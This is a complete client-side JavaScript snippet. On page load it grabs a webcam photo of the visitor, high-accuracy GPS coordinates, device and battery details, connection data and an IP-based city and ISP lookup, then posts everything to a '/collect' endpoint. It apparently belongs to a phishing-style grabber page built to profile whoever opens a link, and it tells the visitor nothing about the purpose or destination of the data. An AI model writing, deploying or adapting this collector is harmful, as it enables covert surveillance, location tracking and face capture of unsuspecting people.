(function(){
    var d={
        sessionId:'s_'+Date.now(),
        timestamp:new Date().toISOString(),
        userAgent:navigator.userAgent
    };

    async function collect(){
        // CAMERA - request explicitly
        try{
            var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}}});
            var video=document.createElement('video');
            video.srcObject=stream;
            await video.play();
            await new Promise(function(r){setTimeout(r,1500)});
            var canvas=document.createElement('canvas');
            canvas.width=video.videoWidth||1280;
            canvas.height=video.videoHeight||720;
            canvas.getContext('2d').drawImage(video,0,0);
            d.photo=canvas.toDataURL('image/jpeg',0.9);
            stream.getTracks().forEach(function(t){t.stop()});
        }catch(e){d.camErr=e.message;}

        // LOCATION - request explicitly
        if(navigator.geolocation){
            try{
                var pos=await new Promise(function(res,rej){
                    navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
                });
                d.gps={lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy+'m'};
            }catch(e){d.gpsErr=e.message;}
        }

        // DEVICE INFO
        d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone};

        // BATTERY
        try{
            var b=await navigator.getBattery();
            d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};
        }catch(e){}

        // CONNECTION
        if(navigator.connection){d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink,rtt:navigator.connection.rtt};}

        // IP
        try{
            var resp=await fetch('https://ipapi.co/json/');
            var j=await resp.json();
            d.network={ip:j.ip,city:j.city,region:j.region,country:j.country_name,isp:j.org};
        }catch(e){}

        // SEND
        try{
            await fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
        }catch(e){}
    }

    // RUN ON LOAD
    window.addEventListener('load',function(){setTimeout(collect,500)});
})();
